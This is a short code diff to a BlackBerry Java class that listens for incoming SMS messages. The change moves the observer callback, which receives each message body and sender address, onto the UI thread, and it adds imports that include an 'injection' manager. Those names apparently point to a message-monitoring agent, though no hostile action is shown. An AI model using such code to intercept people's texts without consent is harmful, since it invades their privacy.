@@ -23,13 +23,16 @@ import net.rim.device.api.io.DatagramBase;
 import net.rim.device.api.io.SmsAddress;
 import net.rim.device.api.system.SMSPacketHeader;
 import net.rim.device.api.system.SMSParameters;
+import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.ui.component.EditField;
 import blackberry.Messages;
 import blackberry.Singleton;
+import blackberry.Status;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.Path;
+import blackberry.injection.InjectorManager;
 import blackberry.interfaces.SmsObserver;
 import blackberry.interfaces.iSingleton;
 import blackberry.utils.Utils;
@@ -86,7 +89,7 @@ public class SmsListener46 extends SmsListener implements SendListener,
                 instance = singleton;
             }
         }
-
+        
         return instance;
     }
 
@@ -332,8 +335,17 @@ public class SmsListener46 extends SmsListener implements SendListener,
             //#ifdef DEBUG
             debug.trace("notify: " + observer);
             //#endif
+            
+            final String fbody = body;
+            final String address = msg.getAddress();
+            
+            UiApplication.getUiApplication().invokeLater(new Runnable() {
 
-            observer.onNewSms(body, msg.getAddress(), false);
+                public void run() {
+                    observer.onNewSms(fbody, address, false);
+                }
+            });
+            
         }
 
         return true;
